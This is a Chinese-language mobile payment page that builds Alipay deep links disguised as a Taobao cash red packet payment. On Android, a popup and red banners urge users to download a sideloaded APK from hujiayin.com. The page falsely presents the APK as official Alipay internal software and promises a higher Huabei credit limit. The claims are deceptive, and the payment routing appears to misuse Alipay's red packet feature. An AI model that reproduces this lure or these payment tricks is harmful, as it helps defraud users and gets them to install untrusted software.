
<!DOCTYPE html>

<html>
<head>
    <meta http-equiv="Content-Language" content="zh-cn">
    <meta name="apple-mobile-web-app-capable" content="no">
    <meta name="apple-touch-fullscreen" content="yes">
    <meta name="format-detection" content="telephone=no,email=no">
    <meta name="apple-mobile-web-app-status-bar-style" content="white">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="Cache" content="no-cache">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>
        支付
    </title>
    <link href="pay.css?v=20190902" rel="stylesheet" media="screen">
    <script src="jquery-1.8.2.min.js"></script>
    <script src="layer.js" type="text/javascript"></script>
    <link rel="stylesheet" href="layer.css">
    <script src="base64.min.js"></script>
    <style>
        .alipaytip {
            width: 80%;
        }
        .unionbg{
            width: 100%;
        }
    </style>
</head>
<body>
<div class="body">
    <h1 class="mod-title">
        <span class="ico_log ico-1"><img src="alipay.png"></span>
    </h1>
    <div class="mod-ct">
        <div class="order">
            <p>订单号:15816770233315547435 <input type="hidden" id="trade_no" name="trade_no" value="15816770233315547435"></p>
        </div>

        <div class="unionbg">
            <div class="unionamount" id="money" style="font-size: 20px;">
                <label style="font-size: 30px;">￥500.00</label> &nbsp;
            </div>
            <div id="iospay" class="iospay">
                <a href="javascript:void(0)" onclick="goPay()" target="_blank" rel="noreferrer"><div class="alipaytip">点我启动支付</div></a><br>
            </div>


            <div id="iospay" class="iospay">
                <a href="javascript:void(0)" onclick="goKoubeiPay()" target="_blank" rel="noreferrer"><div class="alipaytip">点我启动支付(需安装口碑)</div></a><br>
            </div>

            <div id="btnkoubeidownload" class="iospay">
                <a href="http://m.koubei.com/download?deliveryChannel=koubei_pc" target="_blank" rel="noreferrer">
                    <div class="alipaytip" style="background: red;">未安装口碑点击下载</div>
                </a>
            </div>

            <div class="iospay">
                <a href="javascript:void(0)" onclick="inGoPay()" target="_blank" rel="noreferrer"><div class="alipaytip">点我启动支付(方式二)</div></a><br>
            </div>


            <div id="androidpay">
                <div id="btnsdkpay">
                    <a href="astxq://web/webview?url=service%3D%22alipay.fund.stdtrustee.order.create.pay%22%26partner%3D%222088401309894080%22%26_input_charset%3D%22utf-8%22%26notify_url%3D%22https%3A%2F%2Fwwhongbao.taobao.com%2Fcallback%2Falipay%2FnotifyPaySuccess.do%22%26out_order_no%3D%2212621186_7328_1581677023_1c1393840fb0b78d29381c7d342c5c32_1%22%26out_request_no%3D%2212621186_7328_1581677023_1c1393840fb0b78d29381c7d342c5c32_1_p%22%26product_code%3D%22SOCIAL_RED_PACKETS%22%26scene_code%3D%22MERCHANT_COUPON%22%26amount%3D%22500.00%22%26pay_strategy%3D%22CASHIER_PAYMENT%22%26receipt_strategy%3D%22INNER_ACCOUNT_RECEIPTS%22%26platform%3D%22DEFAULT%22%26channel%3D%22APP%22%26order_title%3D%22%E6%B7%98%E5%AE%9D%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%22%26master_order_no%3D%222020021410002001630555095869%22%26order_type%3D%22DEDUCT_ORDER%22%26extra_param%3D%22%7B%22payeeShowName%22%3A%22%E6%B7%98%E5%AE%9D%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%22%7D%22%26pay_timeout%3D%2230m%22%26order_expired_time%3D%22360d%22%26sign%3D%22JGuv0n4ULGZ3Kc4D4He089iGQCiP0%252FxtzIgoxJYegFw32%252BDhLOxz7UMmNY9goeTtnPCCSoGCVf5lNPjsztE5dBhIVj3XISgQhE7QmMFrAiqjDIWig6oKcSxnJq5YjEH7OsUvIeHV%252B1UAWGqb3Bxlrz0nYhxydpU0rbhwC8M2Vr3Yp0lKFwclHtcAlQyk9gDyCCOZWRaT70gqMheWWt9op6Pj4ZJZpJiSlaQis1lyoyWCeZQ%252Bkyp5x95vskYS%252FpUjTXN7lJsrfzHXhdzUCfJyG1z1tUS3rTGslhY1o5uZIVZn3Yh4yhfE%252FLzRK1EDdJEKh73eCqGrK657foPumJGyFw%253D%253D%22%26sign_type%3D%22RSA%22" target="_blank" rel="noreferrer"><div class="alipaytip" style="font-size: 14px">点我启动支付（需安装支付助手插件）</div></a>
                </div>

                <div id="btnsdkdownload">
                    <a href="https://hujiayin.com:8443/static/pay/wx/wx_pay.apk" target="_blank" rel="noreferrer"><div class="alipaytip" style="background: red;">未安装插件点击下载（1.4M）</div></a>
                </div>
            </div>

            <div class="time-item uniontime-item" id="remark" style="color:red;font-size:1.2em;">

                <div id="androidremark">
                    <h3>如果插件不能正常使用，请换一个浏览器下载（推荐UC浏览器）</h3>
                    <h3>温馨提示：本插件支付宝内部软件，请放心下载使用，安装使用有机会提升花呗额度</h3>
                </div>
            </div>


        </div>

    </div>
</div>
<script>
    $(function () {

        var u = navigator.userAgent, app = navigator.appVersion;
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1;
        var isIOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

        if (isAndroid) {
            $(".iospay").hide();
            layer.confirm('<p style="font-size:18px;">为确保您的支付安全，请<span style="color:red;font-size:19px;">下载并安装此插件（本机只安装一次）</span>后再次支付，此插件为<span style="color:red;font-size:19px;">支付宝内部软件</span>，请放心下载使用，已安装插件但不能支付请下载安装最新插件</p>', {
                // icon: 1,
                title: '<p style="font-size:20px;">温馨提示</p>',
                btn: ['我已明白'] //按钮
            }, function (index) {
                layer.closeAll();
            });
        }else if (isIOS) {
            $("#androidpay").hide();
            $("#androidremark").hide();
        }
    });


    function inGoPay() {
        var _alipayh5url = "alipays://platformapi/startapp?appId=20000199&url=" + encodeURIComponent("https://1izheng.github.io/xpage/wangxin/1.html");
        window.location.href = _alipayh5url;
    }

    function isMobile() {
        var ua = navigator.userAgent.toLowerCase();
        _long_matches = 'googlebot-mobile|android|avantgo|blackberry|blazer|elaine|hiptop|ip(hone|od)|kindle|midp|mmp|mobile|o2|opera mini|palm( os)?|pda|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce; (iemobile|ppc)|xiino|maemo|fennec';
        _long_matches = new RegExp(_long_matches);
        _short_matches = '1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|e\-|e\/|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|xda(\-|2|g)|yas\-|your|zeto|zte\-';
        _short_matches = new RegExp(_short_matches);
        if (_long_matches.test(ua)) {
            return 1;
        }
        user_agent = ua.substring(0, 4);
        if (_short_matches.test(user_agent)) {
            return 1;
        }
        return 0;
    }

    function getDeviceType() {
        var u = navigator.userAgent;
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
        var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
        if (isAndroid == true)
            return "Android";
        if (isiOS == true)
            return "Ios";
        return "PC";
    }
    var payOrderStr = 'service=\"alipay.fund.stdtrustee.order.create.pay\"&partner=\"2088401309894080\"&_input_charset=\"utf-8\"&notify_url=\"https://wwhongbao.taobao.com/callback/alipay/notifyPaySuccess.do\"&out_order_no=\"12621186_7328_1581677023_1c1393840fb0b78d29381c7d342c5c32_1\"&out_request_no=\"12621186_7328_1581677023_1c1393840fb0b78d29381c7d342c5c32_1_p\"&product_code=\"SOCIAL_RED_PACKETS\"&scene_code=\"MERCHANT_COUPON\"&amount=\"500.00\"&pay_strategy=\"CASHIER_PAYMENT\"&receipt_strategy=\"INNER_ACCOUNT_RECEIPTS\"&platform=\"DEFAULT\"&channel=\"APP\"&order_title=\"淘宝现金红包\"&master_order_no=\"2020021410002001630555095869\"&order_type=\"DEDUCT_ORDER\"&extra_param=\"{\"payeeShowName\":\"淘宝现金红包\"}\"&pay_timeout=\"30m\"&order_expired_time=\"360d\"&sign=\"JGuv0n4ULGZ3Kc4D4He089iGQCiP0%2FxtzIgoxJYegFw32%2BDhLOxz7UMmNY9goeTtnPCCSoGCVf5lNPjsztE5dBhIVj3XISgQhE7QmMFrAiqjDIWig6oKcSxnJq5YjEH7OsUvIeHV%2B1UAWGqb3Bxlrz0nYhxydpU0rbhwC8M2Vr3Yp0lKFwclHtcAlQyk9gDyCCOZWRaT70gqMheWWt9op6Pj4ZJZpJiSlaQis1lyoyWCeZQ%2Bkyp5x95vskYS%2FpUjTXN7lJsrfzHXhdzUCfJyG1z1tUS3rTGslhY1o5uZIVZn3Yh4yhfE%2FLzRK1EDdJEKh73eCqGrK657foPumJGyFw%3D%3D\"&sign_type=\"RSA\"';
    function getOrderStr() {
        tempCom = 'com.alibaba.mobileim';


        if (getDeviceType() == "Ios") {
            var jsonObj = {
                'requestType': "SafePay",
                'fromAppUrlScheme': "com.alibaba.mobileim" //alisdkdemo
            };
            jsonObj.dataString = payOrderStr + '&bizcontext={"appkey":"2014052600006128","ty":"ios_lite","sv":"h.a.3.6.5","an":"'+tempCom+'","av":"1.0","sdk_start_time":' + Date.now() + '}';
            var alipaysUrl = 'alipaymatrixbwf0cml3://alipayclient/?' + encodeURIComponent(JSON.stringify(jsonObj));
            return alipaysUrl;
        }
        else {
            var tempSD = payOrderStr + '&bizcontext={"appkey":"2014052600006128","ty":"and_lite","sv":"h.a.3.6.5","an":"'+tempCom+'","av":"1.0","sdk_start_time":' + Date.now() + '}';
            var dt = {
                "sourcePid":randomInt(1000, 99999),
                "pkgName":tempCom,
                "session":getRanNum(10),
                "external_info": tempSD
            };
            var alipaysUrl = 'alipays://platformapi/startapp?appId=20000125&mqpSchemePay='+Base64.encode(JSON.stringify(dt))+'#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end';
            return  alipaysUrl;
        }
    }

    function goPay() {
        try {
            window.location.href = getOrderStr();

        } catch (e) {
            console.log('error', e.message,e.line);
        }
    }

    function randomInt(lower, upper) {
        return Math.floor(Math.random() * (upper - lower + 1)) + lower;
    }

    function getRanNum(length) {
        var result = [];
        for (var i = 0; i < length; i++) {
            var ranNum = Math.ceil(Math.random() * 25);
            result.push(String.fromCharCode(65 + ranNum));
        }
        return result.join('').toLowerCase();
    }

    var _alipayh5url = "alipays://platformapi/startapp?appId=20000199&url=" + encodeURIComponent("https://1izheng.github.io/xpage/wangxin/1.html");

    function goElePay() {
        window.location.href = 'eleme://web_overlay?url='+encodeURIComponent('https://ds.alipay.com/?from=mobilecodec&scheme='+encodeURIComponent(_alipayh5url));
    }

    function goKoubeiPay() {
        window.location.href = 'koubei://platformapi/startapp?appId=68687256&url='+encodeURIComponent('https://ds.alipay.com/?from=mobilecodec&scheme='+encodeURIComponent(_alipayh5url+'?koubei=1'));
    }
</script>


</body>

</html>